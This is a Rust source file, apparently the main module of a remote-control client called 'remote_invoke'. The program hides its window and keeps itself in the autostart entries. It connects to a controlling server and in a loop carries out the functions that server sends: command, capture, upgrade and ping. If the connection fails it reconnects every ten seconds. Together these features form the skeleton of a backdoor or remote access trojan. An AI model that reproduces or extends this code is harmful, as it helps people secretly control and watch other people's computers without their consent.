#![windows_subsystem = "windows"]

use std::env::current_exe;
use std::time::Duration;
use anyhow::{anyhow, Result};
use auto_launch::AutoLaunch;
use tokio::time::sleep;
use bytes::Buf;
use lazy_static::lazy_static;
use tokio::net::TcpStream;
use variable_len_reader::VariableReadable;
use crate::links::try_select_link;
use crate::network::{recv, send, send_err};

mod links;
mod upgrade;
mod capture;
mod command;
mod network;
mod pinging;

lazy_static! {
    pub static ref AUTO_LAUNCHER: Result<AutoLaunch> = {
        let name = "remote_invoke";
        let path = current_exe()?;
        let path = path.to_str().ok_or(anyhow!("Failed to get current exe"))?;
        Ok(AutoLaunch::new(name, path, &[] as &[&str]))
    };
}

#[tokio::main]
async fn main() {
    loop {
        if let Ok(launcher) = AUTO_LAUNCHER.as_ref() {
            if match launcher.is_enabled() { Ok(success) => !success, Err(_) => true, } {
                let _ = launcher.enable();
            }
        }
        if main_loop().await.is_ok() {
            break;
        }
        sleep(Duration::from_secs(10)).await;
    }
}

async fn main_loop() -> Result<()> {
    let mut stream = if cfg!(release) {
        try_select_link().await?.ok_or(anyhow!("No available server link."))?
    } else {
        TcpStream::connect("127.0.0.1:25565").await?
    };
    loop {
        let mut request = recv(&mut stream).await?.reader();
        let function = request.read_string()?;
        let response = match &function as &str {
            "pinging" => pinging::pinging(&mut request).await,
            "upgrade" => upgrade::upgrade(&mut request).await,
            "command" => command::command(&mut request).await,
            "capture" => capture::capture(&mut request).await,
            _ => Err(anyhow!("Unknown function."))?,
        };
        match response.as_ref() {
            Ok(r) => { send(&mut stream, r).await }
            Err(e) => { send_err(&mut stream, &format!("{:?}", e)).await }
        }?;
        if function == "upgrade" && response.is_ok() {
            break;
        }
    }
    Ok(())
}
